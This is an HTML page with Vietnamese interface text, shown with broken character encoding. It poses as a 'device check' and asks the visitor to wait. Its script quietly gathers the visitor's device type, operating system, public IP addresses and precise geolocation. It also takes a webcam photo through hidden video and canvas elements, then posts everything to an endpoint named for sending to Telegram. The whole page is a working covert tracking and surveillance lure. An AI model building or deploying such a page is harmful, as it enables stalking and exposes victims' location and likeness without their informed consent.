<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Ki·ªÉm tra thi·∫øt b·ªã</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      color: #333;
      text-align: center;
      padding: 50px;
    }
    h3.ten {
      color: #555;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h3 class="ten">ƒêang ki·ªÉm tra thi·∫øt b·ªã, vui l√≤ng ch·ªù...</h3>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const info = {
      time: new Date().toLocaleString(),
      device: '',
      os: '',
      ip: '',
      realIp: '',
      lat: '',
      lon: '',
    };

    function detectDevice() {
      const ua = navigator.userAgent;
      if (/iPhone|iPad|iPod/i.test(ua)) {
        info.device = 'iOS Device';
        info.os = 'iOS';
      } else if (/Android/i.test(ua)) {
        const match = ua.match(/Android.*; (.+?) Build/);
        info.device = match ? match[1] : 'Android Device';
        info.os = 'Android';
      } else if (/Windows NT/i.test(ua)) {
        info.device = 'Windows PC';
        info.os = 'Windows';
      } else if (/Macintosh/i.test(ua)) {
        info.device = 'Mac';
        info.os = 'macOS';
      } else {
        info.device = 'Kh√¥ng x√°c ƒë·ªãnh';
        info.os = 'Kh√¥ng r√µ';
      }
    }

    async function getPublicIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        info.ip = data.ip || 'Kh√¥ng r√µ';
      } catch {
        info.ip = 'Kh√¥ng r√µ';
      }
    }

    async function getRealIP() {
      try {
        const res = await fetch('https://icanhazip.com');
        info.realIp = (await res.text()).trim();
      } catch {
        info.realIp = 'Kh√¥ng r√µ';
      }
    }

    async function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve();
          return;
        }
        navigator.geolocation.getCurrentPosition(
          pos => {
            info.lat = pos.coords.latitude.toFixed(6);
            info.lon = pos.coords.longitude.toFixed(6);
            resolve();
          },
          () => resolve(),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    function getCaption() {
      const mapsLink = info.lat && info.lon
        ? `https://maps.google.com/?q=${info.lat},${info.lon}`
        : 'Kh√¥ng r√µ';
      return `
üïí Th·ªùi gian: ${info.time}
üì± Thi·∫øt b·ªã: ${info.device}
üñ•Ô∏è H·ªá ƒëi·ªÅu h√†nh: ${info.os}
üåç IP d√¢n c∆∞: ${info.ip}
üß† IP g·ªëc: ${info.realIp}
üìç Google Maps: ${mapsLink}
      `.trim();
    }

    async function captureImage() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        return new Promise(resolve => {
          video.onloadedmetadata = () => {
            setTimeout(() => {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext('2d').drawImage(video, 0, 0);
              const imageData = canvas.toDataURL('image/png');

              // D·ª´ng stream sau khi ch·ª•p
              stream.getTracks().forEach(track => track.stop());

              resolve(imageData);
            }, 1000);
          };
        });
      } catch (err) {
        console.error('Kh√¥ng th·ªÉ truy c·∫≠p camera:', err);
        return null;
      }
    }

    async function sendToServer() {
      const text = getCaption();
      const imageBase64 = await captureImage();

      try {
        const response = await fetch('/api/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: text,
            image: imageBase64
          }),
        });

        if (!response.ok) {
          const errorData = await response.json();
          console.error('L·ªói khi g·ª≠i Telegram:', errorData);
        } else {
          console.log('G·ª≠i Telegram th√†nh c√¥ng');
        }
      } catch (error) {
        console.error('L·ªói m·∫°ng ho·∫∑c fetch:', error);
      }
    }

    async function main() {
      detectDevice();
      await getPublicIP();
      await getRealIP();
      await getLocation();
      await sendToServer();
    }

    main();
  </script>
</body>
</html>
